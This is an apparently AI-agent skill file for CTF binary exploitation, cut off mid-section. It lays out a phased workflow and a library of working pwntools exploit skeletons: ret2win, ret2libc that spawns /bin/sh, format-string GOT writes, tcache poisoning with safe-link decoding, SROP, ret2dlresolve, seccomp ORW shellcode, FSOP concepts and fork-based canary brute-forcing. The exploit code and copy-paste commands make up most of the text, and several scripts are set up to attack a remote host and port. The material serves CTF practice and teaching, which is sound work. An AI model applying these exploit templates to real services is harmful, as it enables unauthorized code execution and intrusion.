---
name: pwn
description: Binary exploitation for CTFs — stack ROP, format strings, heap, libc
category: exploitation
phase: exploit
---
Execution policy: follow `skills/_shared/SKILL_CONTRACT.md`; separate evidence from inference, preserve scope, validate each link, and label uncertainty.

# PWN — Binary Exploitation (CTF)

> Technique-only. No real flags. Linux userland CTF pwn with pwntools,
> gdb (pwndbg/GEF), and standard static tools only.

## Mental Model

1. A pwn binary is a contract: `read/gets/scanf/recv` = controlled
   bytes; `printf(user_input)` = format-string oracle;
   `malloc/free/edit/show` = heap primitives.
2. Protections pick the exploit class:
   `NX on + no canary + no PIE` → ret2win/ret2libc; `canary` → leak it
   first (fmt, fork-brute, info leak), never guess; `PIE` → leak a
   `.text`/GOT pointer first, never hardcode; `NX off` → ret2shellcode;
   heap menu → UAF/overflow/double-free → tcache/fastbin/unsorted-bin.
3. Every exploit is a pipeline: **offset → leak → base → chain**. An
   unverified stage makes later stages fiction. Confirm each pointer
   (`vmmap`, `hex()`, low-12 alignment) before chaining.
4. Smallest working primitive wins: `ret2win` > `one_gadget` >
   `ret2libc system()` > `SROP` > `ret2dlresolve`.
5. pwntools owns packing (`p64`), ELF (`elf.sym/got/plt`), ROP
   (`ROP(elf)`), tubes (`process/remote/gdb.debug`). Static tools
   (`checksec`, `ROPgadget`, `ropper`, `one_gadget`, `patchelf`)
   only supply addresses.
6. Remote libc is UNKNOWN until proven: shipped `./libc.so.6` or ≥2
   GOT leaks matched via libc-database. Never trust local libc.

## Workflow

### Phase 1 — Baseline (read-only recon, ≤60s)

1. `file ./vuln; checksec --file=./vuln; ldd ./vuln` — arch + protections.
2. `nm -D ./vuln | grep -iE "win|flag|system"` + full symbol dump via
   `ELF('./vuln').symbols` — hunt `win`/`system`/`/bin/sh`.
3. Run once manually: record prompts, `read` sizes, menu indices, echo points.
4. Record arch, NX/PIE/canary/RELRO, offset=unknown, leak=unknown,
   libc=`TODO-leak` or shipped path.
5. Save to `artifacts/<task>/baseline.txt`.

Reasoning Checkpoint: `Baseline complete — checksec=X, arch=Y, win=Z, surface=W — proceed to Confirmation?`

### Phase 2 — Confirmation (prove bug class, no weaponized chain)

1. Overflow: send `cyclic(512)`, crash locally, parse core —
   amd64: `cyclic_find(core.read(core.rsp, 8))`; i386: `cyclic_find(core.eip)`.
2. Format string: send `AAAA.%p.`×12 sweep then `%<i>$p` for i=1..30.
   Reflected `0x...` = confirmed; note marker position.
3. Heap: one benign pass per menu op (alloc 0x20/0x80/0x100, free
   reorder, show-after-free). Old data after free = UAF read.
4. Gadgets (inventory only): `ROPgadget --binary ./vuln | grep -E
   "pop rdi|: ret$"` → record `pop_rdi`, bare `ret` (movaps align).
5. No ROP chain in this phase — patterns and probes only.

Reasoning Checkpoint: `Confirmation complete — bug=X, off=N|fmt=M|heap=P, gadgets=G — proceed to Negative?`

### Phase 3 — Negative (rule out dead ends, ≤3 probes)

1. `win` exists + PIE on + no leak → ret2win GATED on leak, not now.
2. NX on (check `checksec` + `vmmap` stack lacks `rwx`) → drop shellcode, commit ROP.
3. Canary on: one over-long input → `*** stack smashing detected ***`
   confirms enforcement; kill RIP-overwrite plans without leak.
4. Heap on glibc ≥2.32: UAF-`show` a freed fd — mangled value means
   safe-link active → must decode before poisoning, never raw `p64`.
5. One GOT leak only + unknown libc → need SECOND leak or shipped libc;
   single-leak libc-database match is unreliable.

Reasoning Checkpoint: `Negative complete — ruled_out=[X,Y], path=Z — proceed to gated Exploit?`

### Phase 4 — Exploit (ONE gated step, ≤120s)

1. Pick ONE skeleton: E1 ret2win, E2 ret2libc-leak, E3 fmt-write, E4 tcache.
2. Write `artifacts/<task>/solve.py` from P0 header: `sendlineafter`
   with `timeout=5`, `log.success(hex(leak))`, assert low-12 sanity.
3. `timeout 120 python3 artifacts/<task>/solve.py LOCAL` — need win/shell/marker.
4. Only if local passes: same script `REMOTE HOST PORT`.
5. On crash: `bt`/core fault addr, change ONE variable next turn.

Reasoning Checkpoint: `Exploit complete — local=X, remote=Y|skipped, fault=F|none — proceed to Validation-handoff?`

### Phase 5 — Validation-handoff (prove + package)

1. Re-run twice locally (ASLR/heap flake check). Both must hit marker.
2. Flag hygiene: script cats flag via shell/`win`, never hardcodes it.
3. Save `solve.py`, `transcript.txt` (flag→`FLAG{REDACTED}`), checksec, leaks, libc id.
4. Hand off: binary, command
   (`python3 artifacts/<task>/solve.py REMOTE <h> <p>`), offset, leak math, 1-line summary.
5. Remote fail + local pass = `blocked(remote)`, ≤3 remote tries total, 500B error tail.

Reasoning Checkpoint: `Handoff complete — status=solved|blocked, technique=X — end.`

## Tool Table (exact copy-paste commands)

| Goal | Command |
|---|---|
| Protections | `checksec --file=./vuln` |
| File + libs | `file ./vuln; ldd ./vuln` |
| Symbols | `nm -D ./vuln \| head -50; nm ./vuln \| grep -iE "win\|flag\|system"` |
| Pattern 512B | `python3 -c "from pwn import *; open('/tmp/pat','wb').write(cyclic(512))"` |
| Offset amd64 | `python3 -c "from pwn import *; c=Coredump('./core'); print(cyclic_find(c.read(c.rsp,8)))"` |
| Offset i386 | `python3 -c "from pwn import *; c=Coredump('./core'); print(cyclic_find(c.eip))"` |
| CLI cyclic | `pwn cyclic 512 > /tmp/pat; pwn cyclic -l 0x6261616163616161` |
| pop-rdi | `ROPgadget --binary ./vuln \| grep -E "pop rdi"` |
| pop-rdi (alt) | `ropper --file ./vuln --search "pop rdi"` |
| pop-rdi (py) | `python3 -c "from pwn import *; r=ROP(ELF('./vuln')); print(hex(r.find_gadget(['pop rdi','ret'])[0]))"` |
| Bare ret | `ROPgadget --binary ./vuln \| grep -E ": ret$"` |
| one_gadget | `one_gadget ./libc.so.6` |
| autofmt offset | `python3 -c "from pwn import *; from pwnlib.fmtstr import FmtStr; p=process('./vuln'); print(FmtStr(lambda x:(p.sendline(x),p.recv())[1]).offset)"` |
| fmt payload | `python3 -c "from pwn import *; print(fmtstr_payload(6,{0x404040:0x1337},write_size='short'))"` |
| SROP frame | `python3 -c "from pwn import *; context.arch='amd64'; f=SigreturnFrame(); f.rax=59; print(bytes(f).hex())"` |
| ret2csu preview | `python3 -c "from pwn import *; r=ROP(ELF('./vuln')); r.ret2csu(0,0,0,0,0,0,0,0,0); print(r.dump())"` |
| Pin libc locally | `cp ./vuln ./vp; patchelf --set-interpreter ./ld.so ./vp; patchelf --replace-needed libc.so.6 ./libc.so.6 ./vp` |
| gdb.debug | `python3 -c "from pwn import *; io=gdb.debug('./vuln',gdbscript='b main\nc'); io.interactive()"` |
| gdb.attach | `python3 -c "from pwn import *; p=process('./vuln'); gdb.attach(p,gdbscript='b main\nc')"` |

## Payload / Code Library

### P0 — Canonical header + offset discovery (every solve starts here)

```python
#!/usr/bin/env python3
from pwn import *
context.arch = 'amd64'; context.os = 'linux'
BIN = './vuln'; HOST, PORT = '127.0.0.1', 1337
elf = ELF(BIN)
# libc = ELF('./libc.so.6')  # when challenge ships libc
def start():
    if args.REMOTE: return remote(HOST, PORT, timeout=5)
    if args.GDB: return gdb.debug(BIN, gdbscript='b main\nc', aslr=False)
    return process(BIN)
# Offset: send cyclic(512), crash, then:
#   amd64: off = cyclic_find(core.read(core.rsp, 8))
#   i386 : off = cyclic_find(core.eip)
```

### E1 — SKELETON ret2win (+ret alignment for movaps)

```python
from pwn import *
elf = ELF('./vuln'); rop = ROP(elf)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret = rop.find_gadget(['ret'])[0]  # 16B stack align (movaps)
io = remote(HOST, PORT, timeout=5) if args.REMOTE else process('./vuln')
io.sendlineafter(b':', flat({40: [ret, pop_rdi, 0x0, elf.symbols['win']]}))
io.interactive()  # drop pop_rdi+arg if win() takes none
```

### E2 — SKELETON ret2libc with GOT leak (two-stage loop)

```python
#!/usr/bin/env python3
from pwn import *
BIN = './vuln'; elf = ELF(BIN); rop = ROP(elf)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret = rop.find_gadget(['ret'])[0]; OFF = 40
HOST, PORT = '127.0.0.1', 1337
mk = lambda: remote(HOST, PORT, timeout=5) if args.REMOTE else process(BIN)
io = mk()  # Stage 1: leak puts@GOT via puts@PLT, loop to main
io.sendlineafter(b':', flat({OFF: [pop_rdi, elf.got['puts'], elf.plt['puts'], elf.symbols['main']]}))
io.recvuntil(b'\n')
puts = u64(io.recvline().strip().ljust(8, b'\x00')); io.close()
log.success(f'puts={hex(puts)}')
libc = ELF('./libc.so.6'); libc.address = puts - libc.symbols['puts']
binsh = next(libc.search(b'/bin/sh'))
io2 = mk()  # Stage 2: system("/bin/sh")
io2.sendlineafter(b':', flat({OFF: [ret, pop_rdi, binsh, libc.symbols['system']]}))
io2.interactive()
```

### E3 — SKELETON fmt leak then write (short writes)

```python
#!/usr/bin/env python3
from pwn import *
from pwnlib.fmtstr import fmtstr_payload
BIN = './vuln'; elf = ELF(BIN)
mk = lambda: process(BIN)
for i in range(1, 30):  # find marker position
    io = mk(); io.sendlineafter(b':', f'AAAA.%{i}$p'.encode())
    if b'41414141' in io.recvall(timeout=2): log.success(f'marker@{i}'); break
    io.close()
OFF = i
io = mk()  # leak chain: canary? PIE (0x55..)? libc (0x7f..)?
io.sendlineafter(b':', b'%11$p.%13$p.%15$p.')
log.info(io.recvline())
# GOT hijack needs Partial RELRO only:
# io.sendlineafter(b':', fmtstr_payload(OFF, {elf.got['puts']: elf.symbols['win']}, write_size='short'))
io.interactive()
# Autofmt alternate: FmtStr(lambda x: (process(BIN).sendline(x), process(BIN).recv())[1]).offset
```

### E4 — SKELETON tcache poison with safe-link decode (glibc ≥2.32)

```python
#!/usr/bin/env python3
from pwn import *
io = process('./vuln')  # ADAPT menu bytes/indices to target
def cmd(c): io.sendlineafter(b'>', str(c).encode(), timeout=5)
def alloc(i, s, d): cmd(1); io.sendlineafter(b'i', str(i).encode()); io.sendlineafter(b's', str(s).encode()); io.sendlineafter(b'd', d)
def free(i): cmd(2); io.sendlineafter(b'i', str(i).encode())
def show(i): cmd(3); io.sendlineafter(b'i', str(i).encode()); return io.recvline()
def edit(i, d): cmd(4); io.sendlineafter(b'i', str(i).encode()); io.sendlineafter(b'd', d)
protect = lambda pos, val: (pos >> 12) ^ val  # PROTECT(pos,ptr)=(pos>>12)^ptr
reveal = protect
alloc(0, 0x28, b'A' * 8); alloc(1, 0x28, b'B' * 8); free(0); free(1)
enc = u64(show(1).strip().ljust(8, b'\x00'))  # UAF read of encoded fd
# pos = <addr of victim next field> (needs heap leak first); then:
# edit(1, p64(protect(pos, target))); alloc(2, 0x28, b'X'*8); alloc(3, 0x28, p64(0xdeadbeef))
io.interactive()
```

### E5 — ret2shellcode (NX off) + one_gadget/ret2csu/SROP/dlresolve + pivot

```python
from pwn import *
context.arch = 'amd64'
# shellcode (NX off only): sc into known buf, RIP -> buf
sc = asm(shellcraft.sh())
# pay = flat({OFF: [buf_addr]}); stage1 writes sc, stage2 overwrites RIP
# one_gadget: $ one_gadget ./libc.so.6 -> try each constraint addr
#   pay = flat({OFF: [libc.address + 0x45226]})  # pad rsp+0x30==NULL as needed
# ret2csu (no pop-rdi, has __libc_csu_init):
#   rop.ret2csu(rbx, rbp, r12, r13, r14, r15, ret_last); rop.call(fn, args)
# SROP: frame=SigreturnFrame(); frame.rax=59; frame.rdi=binsh; frame.rip=syscall_ret
# ret2dlresolve (no leak fn): dl=Ret2dlresolvePayload(elf,symbol='system',args=['/bin/sh'])
#   rop.read(0, dl.data_addr); rop.ret2dlresolve(dl)
# leave-ret pivot: flat({OFF_RBP: p64(buf), OFF_RIP: p64(leave_ret)})
# partial overwrite (PIE fork): overwrite RIP low 1-2B only (high bytes stay)
```

## Decision Tree

```text
checksec + file + nm
├─ win() present?
│  ├─ no canary + no PIE → E1 (P0 offset). DONE.
│  ├─ canary → leak first (fmt %p / fork-brute §B). Then E1.
│  └─ PIE → .text leak first (fmt/GOT). Rebase win. Then E1.
├─ printf(user)? → FMT: %i$p sweep → canary/PIE/libc → E3 short-write or feed E2.
├─ NX on + overflow?
│  ├─ puts/write@PLT + main loop → E2 leak loop.
│  ├─ no leak fn + csu → ret2csu→write(1,got,8) → E2.
│  ├─ any libc leak → one_gadget list first (cheapest).
│  └─ nothing → SROP (sigreturn gadget) / ret2dlresolve.
├─ NX off? → E5 shellcode to buf.
├─ malloc menu? → HEAP: show-after-free=UAF leak; ≥0x90 free=unsorted libc
│   leak; edit-after-free=E4 poison (decode safe-link!); ≥2.34: skip FSOP,
│   target tcache→stack/retaddr; 2 leaks for libc-database.
└─ blocked? → §B bypass matrix.
```

### §B — Canary/PIE/ASLR/NX bypass matrix

| Block | Bypass | Condition |
|---|---|---|
| Canary, forking svc | Byte brute-force (`00` low byte known; ~256×3) | socat `fork` per-conn re-fork |
| Canary + fmt | `%<k>$p` leak (often slot ~11-15, ends `00`, run-stable) | reflection works |
| PIE, any leak | `.text` ptr from stack / GOT→calc base; `elf.address=leak-off` | 1 good pointer |
| PIE fork, no leak | Partial overwrite RIP low 1-2B (`&0xfff` page-stable) | fork, nearby target |
| ASLR + leak fn | GOT leak → `libc.address=leak-sym` | shipped libc or 2-symbol db match |
| ASLR, fmt only | `%p` sweep for `__libc_start_main` ret (0x7f..); verify low12 ×2 runs | version offsets differ |
| NX, binary gadgets | `pop rdi; ret` + `ret` align from binary | ROPgadget/ropper |
| NX, no binary gadgets | `ROP(libc)` gadgets after leak | 1 libc leak |
| Full RELRO | No GOT hijack; target retaddr/stack instead | drop GOT plans |

### §H — Heap glibc notes (condensed)

- **UAF**: `free(a);show(a)`=heap/libc fd leak; `edit(a)`=metadata poison. Map ops first.
- **Safe-link ≥2.32**: stored `next=(chunk>>12)^real`. Encode `protect(pos,t)`,
  decode `reveal(pos,enc)`; `pos`=addr of `next` field. Needs heap leak. Raw `p64` crashes.
- **Fastbin dup (<2.32)**: `free(a);free(a)`→same chunk twice→overlap. New glibc blocks it; use UAF.
- **Unsorted-bin leak**: free ≥0x90 (or fill tcache 7×) → `fd`→`main_arena` →
  `libc.address=leak-OFFSET`, OFFSET is version-specific (2.27≠2.31≠2.35). Verify, never guess.
- **Force/Spirit (fallback)**: Force=overflow top size→steer malloc; Spirit=forge
  fake chunk→free it. Rare; only when tcache/fastbin unavailable.
- **≥2.34 `_IO`/hooks**: `_IO_list_all` gone/renamed, `__malloc_hook`/`__free_hook`
  removed → skip FSOP; prefer tcache→stack return address / `__exit_funcs`.
- **libc-database**: 2 GOT leaks (puts+read) to match; 1 leak unreliable.

### §G — GDB pwndbg/GEF cheat + §L patchelf pinning

```text
gdb ./vuln → b main / b *main+123; r </tmp/pat; c/si/ni/fin; bt
vmmap (bases+N X); telescope $rsp 40; cyclic -l $rip (GEF offset)
search 0x41414141; x/20gx $rsp; x/i $rip; rop --grep "pop rdi" (pwndbg)
heap/bins/tcache (pwndbg heap state); set disable-randomization off (ASLR on test)
```

```bash
cp ./vuln ./vp; patchelf --set-interpreter ./ld.so ./vp
patchelf --replace-needed libc.so.6 ./libc.so.6 ./vp
readelf -l ./vp | grep -A2 INTERP; ./vp  # smoke test, then exploit ./vp
```

## AI Automation Notes

- **Timeouts**: recon ≤60s; tube ops `timeout=5`; `solve.py` via `timeout 120`;
  never `interactive()` in batch — gate with `args`.
- **Retry caps (@3)**: ≤3 negative probes; ONE variant per turn; ≤3 remote
  tries total → `blocked`. Change exactly one variable per retry.
- **Leak checks**: nonzero, low-12 matches known symbol, `.text` inside
  `elf.address` range. Reject-and-reparse on mismatch.
- **Gadgets**: confirm via `ROP(elf).dump()`/`objdump`; always include bare
  `ret` (Ubuntu `movaps` crashes unaligned `system`).
- **Heap**: log idx+size every op; sketch tcache list before poisoning;
  decode safe-link with proven heap leak first.
- **Artifacts**: `artifacts/<task>/solve.py` (+`.bak`), redacted
  `transcript.txt`; never log raw flag.
- **Stop**: shell/marker ×2; 3rd identical crash; missing primitive
  (canary+PIE, no leak) → `blocked(need-leak)`.
- **Boundary**: this skill emits `solve.py` bytes; `sessions` owns `conn`/`dbg` lifecycle.

## Advanced / Hard-Challenge Playbook (§X — gated, enter only after §B stalls)

> Entry rule: do not enter §X until Phase 3 ruled out skeletons E1–E5
> AND you hold ≥1 proven leak (heap, libc, canary, or PIE base).
> Each subsection is ONE gated variant — change one variable per retry.

### X1 — Heap grooming + Feng Shui (deterministic layout before exploit)

1. Grooming = allocate in a fixed sequence; Feng Shui = free in a chosen
   order so the NEXT allocations land on slots you control. Goal: victim
   chunk adjacent to attacker-controlled chunk with known freelist order.
2. Baseline the allocator first: `ldd` fixes the glibc family; one gdb run
   allocating 0x20/0x80/0x100 with `heap`/`bins`/`tcache` dumps fixes the
   rounding (`request2size`: +8 header, round up to 0x10) and which bin
   each size lands in. Never assume sizes — confirm via debugger.
3. Canonical groom (abstract): `alloc A B C guard` (same size); `free B`
   puts B at tcache head; next same-size `alloc D` reuses B's slot. Prove
   reuse with a marker write in D read back through any stale pointer.
4. Guard chunk: keep one live allocation between your overflow source and
   top chunk so consolidation never swallows the victim. Free ≥0x90 chunks
   only when you WANT an unsorted-bin libc leak — and pre-fill tcache
   (7 same-size frees) first so the 8th free lands in unsorted bin.
5. LIFO discipline: tcache is last-freed = first-reused. To land chunk X
   on freed slot S, free S LAST among same-size frees. Verify with a
   `tcache` dump — predicted head must equal observed head, else re-groom.
6. Large-chunk leak sequencing: for a `main_arena` leak use size ≥0x400,
   freed after that size's tcache is full; read `fd`, expect a `0x7f..`
   pointer whose low-12 matches the SHIPPED libc's computed offset tail
   (leak-and-compute only — see §V, never hardcode).

### X2 — _IO_FILE attacks (FSOP concepts by glibc era)

1. Model: every stdio stream is `_IO_FILE_plus` = `_IO_FILE` + `vtable`
   pointer to a table (`__overflow`, `__underflow`, `__doallocate`, …).
   Trigger paths call through that table: `exit()` → `__run_exit_handlers`
   → `_IO_cleanup` → `_IO_flush_all_lockp` → `_IO_OVERFLOW(fp, EOF)`;
   also `abort()` (malloc corruption detection) and return from `main`.
2. Per-FILE flush condition (concept): a FILE is flushed only if its
   read/write pointers disagree (`_IO_write_ptr > _IO_write_base` for
   byte streams, wide-data equivalents for wide streams). A forged FILE
   must satisfy this condition or the dispatch never fires — set the
   pointer pair accordingly in the fake struct.
3. Era map (concept, confirm offsets on the SHIPPED libc):
   - `<2.24`: direct forged vtable possible (no range check).
   - `2.24–2.27`: `_IO_vtable_check` requires vtable inside libc's own
     tables → point at a REAL in-range table (`_IO_str_jumps` family) and
     abuse its `__overflow` (`_IO_str_overflow` malloc/memcpy gadgetry).
   - `≥2.28`: wide-char path — point vtable at real `_IO_wfile_jumps`
     (passes the check); its `__overflow` (`_IO_wfile_overflow`) reaches
     `_IO_wdoallocbuf` → `_IO_WDOALLOCATE`, an indirect call through
     `_wide_data->_wide_vtable`, which is NOT range-checked.
   - `≥2.34` (hooks removed): House-of-Apple-style variants are the
     default hookless finish — fake `_IO_wide_data` + fake wide-vtable
     with attacker slot at the `__doallocate` offset; first arg (`fp`)
     is attacker-controlled so a `system`-slot lands on attacker bytes.
4. Needs (all three, in order): (a) libc leak to resolve the real jump
   table address; (b) write primitive over a FILE (`stdout`/`stderr` via
   heap overlap, or direct `_IO_list_all`/`_chain` overwrite) plus
   controlled scratch for fake wide-data; (c) flush trigger (`exit`,
   `abort`, menu quit). Missing any one → do not attempt FSOP; fall back
   to tcache→stack/return-address (§X9).
5. stdout-leak starter (cheap FSOP-adjacent): corrupt `_IO_2_1_stdout_`'s
   `_IO_write_base`/`_IO_write_ptr` so the next `puts`/`printf` dumps
   attacker-chosen memory = free libc leak with zero heap shaping. Then
   upgrade to full FSOP only if code-exec beyond the leak is required.
6. `≥2.34` guard: `_IO_list_all` may be gone/renamed and hooks are dead —
   never plan `__malloc_hook`/`__free_hook` or naive forged-vtable FSOP
   there; target wide-vtable or non-FILE endgames instead.

### X3 — ret2dlresolve on x86-64 (no libc leak available)

1. When: RELRO is NOT Full (Partial/No — GOT writable or `.dynamic`
   reachable), no leak function exists, but you have a stack overflow +
   a write primitive (`read`/`gets`) and a writable buffer (`.bss`).
2. Mechanism (concept): forge the dynamic-linker structs (`Elf_Sym`,
   `Elf_Rel`, string name) in the writable buffer so `_dl_runtime_resolve`
   resolves an attacker-chosen symbol (e.g. `system`) on demand.
3. pwntools automates it — canonical shape:
   ```python
   from pwn import *
   elf = ELF('./vuln'); rop = ROP(elf)
   dl = Ret2dlresolvePayload(elf, symbol='system', args=['/bin/sh'])
   rop.read(0, dl.data_addr)   # stage 1: read() forges structs into .bss
   rop.ret2dlresolve(dl)       # stage 2: plt_init + forged reloc offset
   io.sendline(flat({OFF: rop.chain()}))
   io.sendline(dl.payload)      # feeds forged Sym/Rel/str + "/bin/sh"
   ```
4. Hard requirements: a second input round must reach the `read` (loop
   back to `main`/vuln or stack-pivot to re-enter); `dl.data_addr` must
   be a truly writable address (`elf.bss()` + margin); Full RELRO kills
   this technique outright — detect via `checksec` BEFORE building.
5. Debug: `rop.dump()` must show `read(0, data_addr)` then `[plt_init]`
   with a large `reloc_index`; fault at plt_init = bad index alignment —
   regenerate, do not hand-tweak struct bytes.

### X4 — SROP with minimal gadgets (sigreturn-oriented programming)

1. When: almost NO gadgets (static tiny binary, no `pop rdi`), but you
   have a `syscall; ret` (or `int 0x80`) plus a way to invoke `sigreturn`
   (`0xf` in `rax` + `syscall`, or a `sigreturn` gadget in vDSO/libc).
2. Mechanism (concept): `rt_sigreturn` restores the FULL register context
   from a `SigreturnFrame` lying on the stack — you dictate every
   register (`rax/rdi/rsi/rdx/rip`) in one frame, no per-register gadgets.
3. Minimal chain shape (abstract):
   ```python
   from pwn import *
   context.arch = 'amd64'
   frame = SigreturnFrame()
   frame.rax = 59            # execve (or 0/1 for ORW read/write)
   frame.rdi = binsh_addr    # pointer you leaked or placed in .bss
   frame.rsi = 0; frame.rdx = 0
   frame.rip = syscall_ret   # the ONE syscall gadget
   pay = flat({OFF: [sigreturn_gadget, syscall_ret, bytes(frame)]})
   # flow: sigreturn_gadget sets rax=0xf + syscalls -> kernel restores
   # frame -> rip=syscall_ret executes execve with your registers
   ```
4. Constraints: frame must sit at the exact `rsp` the kernel reads on
   `sigreturn` (pad precisely — off-by-8 = garbage registers); stack must
   be stable (no further input consuming bytes mid-frame); under seccomp
   prefer ORW register sets (`rax=0/1`) over `execve` (see §X5).
5. 32-bit note: `int 0x80` + `sigreturn` (`0x77`) works analogously with
   `SigreturnFrame` in `i386` context; syscall numbers differ (`open=5`,
   `read=3`, `write=4`, `execve=11`).

### X5 — Seccomp-constrained ORW chains (execve blocked)

1. Diagnose FIRST, never assume: `seccomp-tools dump ./vuln` (or static
   filter review) lists allowed vs `KILL` syscalls. Blocked `execve`(59) +
   allowed `open/openat + read + write` = ORW challenge. A `system()` or
   `execve` shellcode that "silently exits" is the signature symptom.
2. ORW shellcode (position-independent, abstract):
   ```python
   sc = asm(shellcraft.open('/flag.txt', 0)
            + shellcraft.read('rax', 'rsp', 0x100)
            + shellcraft.write(1, 'rsp', 0x100))
   ```
   Adapt the path (`/flag.txt` is a PLACEHOLDER — discover the real path
   via `strings`/decompile/`ls` of the challenge dir, never guess twice:
   send one probe that prints the directory or errors verbosely).
3. `open` blocked but `openat`(257) allowed → swap to
   `shellcraft.openat(-100, path, 0)` (`AT_FDCWD=-100`). `read` blocked →
   try `pread64`(17)/`readv`(19); `write` blocked → `writev`(20)/
   `sendfile`(40). Re-dump the filter after each hypothesis change.
4. ROP-flavored ORW (no shellcode buffer, NX on): chain
   `pop rdi/rsi/rdx/rax + syscall_ret` with `rax=257/0/1` to
   `openat/read/write` the flag to stdout — needs a `/flag…` string in
   binary or a leaked writable buffer you pre-filled via `read(0, buf)`.
5. Pre-opened-fd variant: if the filter was installed AFTER the flag was
   opened (hint: "read without opening"), brute-force small fds (3,4,5)
   with `read(fd, rsp, 0x100)+write(1, rsp, 0x100)` — no `open` needed.
6. Clean-exit discipline: end ORW with `exit(0)`; distinguish seccomp-KILL
   (no output, killed status) from clean exit (status 0, empty = wrong
   path/fd) — see §F.

### X6 — Remote libc identification via 2-leak database matching

1. Rule: ONE GOT leak never identifies a libc (collisions across builds).
   Leak TWO function addresses (e.g. `puts` + `read`, or `puts` +
   `__libc_start_main`) from the SAME run — same-run pairing is mandatory
   (ASLR slides together; cross-run pairing is garbage).
2. Match offline against a local libc collection/database by
   `(sym1 - sym2)` delta + low-12 tails: compute the delta locally, keep
   only candidates where BOTH symbols fit. If the challenge ships
   `./libc.so.6`, it outranks ANY database guess — pin with `patchelf`
   and verify `puts` offset matches the live leak before exploiting.
3. Reliability ladder: shipped libc (exact) > 2-leak db match (strong) >
   1-leak + build-id/ banner (weak, needs behavioural confirm) >
   local-system libc (never trust — distro/version skew kills offsets).
4. Behavioural confirm of a candidate: compute `system`/`binsh` from the
   candidate base, then trigger a LOW-RISK observable (e.g. `puts(binsh)`
   prints a `sh`-ish string, or `system("echo MARKER")` reflects) BEFORE
   committing to interactive shell. Wrong guess = crash, not shell.
5. Record in handoff: both raw leaks, computed delta, libc id/version,
   and the confirm probe output. A handoff with one leak + "probably
   Ubuntu 22.04" is `blocked(need-second-leak)`, not solved.

### X7 — Fork-based ASLR/canary brute-force math (forking services only)

1. Precondition (ALL must hold): each connection `fork()`s WITHOUT
   `execve` (canary/ASLR/PIE identical across probes — verify: same
   leaked byte stable across 3 reconnects); crash kills only the child
   (parent re-accepts); observable oracle per guess (response vs hang vs
   close). `execve`-per-connection or rerolled layout → math void, must
   leak instead.
2. Canary brute force (byte-by-byte, LSB known `0x00` first on amd64):
   cost ≈ `256 × 7 ≈ 1792` probes worst-case (~256×3 average with early
   hits). Oracle: correct byte → service continues/persists; wrong byte →
   `*** stack smashing detected ***` + child death. Script:
   prefix-known-good + guess byte, classify on oracle, append on success.
3. PIE/ASLR byte force (same oracle, target saved-RIP low bytes): page
   alignment fixes low-12 (`& 0xfff` stable) — only the unknown nibble(s)
   need forcing (1/16 per nibble, NOT 1/256). Partial overwrite (X8) is
   usually cheaper than full-word force — prefer it.
4. Budget math: `probes × per-probe RTT` must fit the tier (§T). Example:
   1792 probes × 0.2s ≈ 6 min — medium-tier OK; × 2s RTT ≈ 60 min — hard
   tier only with resume/checkpointing (save known-good prefix to
   `artifacts/<task>/prefix.bin` every byte). Abort to leak-based plan if
   projected time > tier budget.
5. Alphabet care: with `gets`/`strcpy`-style input, `\x00`/`\x0a`
   terminate — skip them in candidates; with `read`/`recv`, full 0x00–FF
   is brute-forceable. Wrong-alphabet force loops forever — first stall
   diagnosis is always "check input function".

### X8 — Stack-pivot chains (small overflow / relocated control)

1. When: overflow too small to fit a full ROP chain, or you must move
   `rsp` to a bigger buffer (`.bss`, heap, leaked stack area) you control.
2. Gadget pair: `leave; ret` (= `mov rsp, rbp; pop rbp; pop rip`) is the
   workhorse — set `rbp = new_stack - 8`-ish via an earlier write or a
   `pop rbp; ret`, overflow saved-`rbp` + saved-`rip` with
   `flat({OFF_RBP: p64(pivot_target), OFF_RIP: p64(leave_ret)})`.
3. One-gadget pivots: `pop rsp; ret`, `add rsp, N; ret`, `xchg rsp, rax`
   family all work — inventory with
   `ROPgadget --binary ./vuln | grep -E "leave|pop rsp|xchg.*rsp"`.
   Confirm semantics in `objdump` (pwntools names vary by version — §V).
4. Two-stage shape (abstract): stage 1 overflows to pivot (`rbp`→`.bss`
   scratch you pre-filled via `read(0, bss_addr, big)`); stage 2's REAL
   ROP chain lives at the scratch. Verify `rsp` lands with `telescope`
   in gdb BEFORE placing the stage-2 chain — off-by-8 pivots execute
   your chain shifted (classic silent crash).
5. Heap-to-stack variant: tcache poison allocates a chunk over a saved
   `rbp`/return address, then the pivot target is the heap chunk itself —
   needs BOTH heap and stack leaks; cost is high, so attempt only when
   direct RIP overwrite is impossible (tiny overflow + no direct chain).

### X9 — RELRO-Full endgames (GOT is off-limits)

1. Detection: `checksec` shows `Full RELRO` → drop ALL GOT-hijack plans
   (fmt-GOT-write, ret2dlresolve, `__malloc_hook` eras are dead).Targets,
   in preference order:
2. Saved return address / stack data: overflow, fmt-write to stack, or
   tcache-poison a chunk overlapping a saved `rbp`/RIP — classic, always
   available when you hold an arbitrary-write + stack leak.
3. Application function pointers / dispatch tables / `__exit_funcs` /
   `operational` structs: overwrite a pointer the program itself calls
   (menu handler table, destructor list) — find via decompile (`/rev`
   escalation, §E) rather than guessing.
4. FSOP wide-vtable (§X2) on `≥2.28` / Apple-style on `≥2.34`: FILE
   structs are NOT protected by RELRO — needs heap-FILE overlap + leaks,
   but bypasses Full RELRO entirely.
5. `one_gadget`-into-existing-call: if you control an indirect call's
   argument already (e.g. pointer passed to a callback), a single
   `system`-equivalent address may suffice with zero stack control.

Reasoning Checkpoint: `Advanced playbook complete — variant=Xn, needs=[leaks|gadgets], era-check=Y — proceed to chained Exploit?`

## Multi-Step Chains (§M — abstract patterns, adapt addresses)

### M1 — Classic hardened stack: canary + PIE + ASLR + NX (leak→compute→stage2)

1. Setup facts: overflow exists; `puts@PLT` + loop-back (`main`) exist;
   protections = canary + PIE + NX + Full/Partial RELRO; remote libc
   shipped (preferred) or unknown (needs 2 leaks).
2. Step 1 — canary + PIE leak via fmt or over-read: send `%<k>$p.` sweep
   (fmt case) and classify reflections: value ending `00` + run-stable =
   canary candidate; `0x55..` = PIE `.text`; `0x7f..` = libc. Confirm each
   across 2 runs (reroll-stable = canary is WRONG — canary must be stable
   per-process; PIE/libc must change under ASLR test). Record slots.
3. Step 2 — base computation (pure arithmetic, script asserts each):
   `pie_base = pie_leak - known_offset` (`known_offset` from `ELF`
   static analysis of the leaked site); `elf.address = pie_base`;
   `canary = confirmed_value` (exact match, no masking).
4. Step 3 — stage-1 ROP (PIE-rebased): overflow with
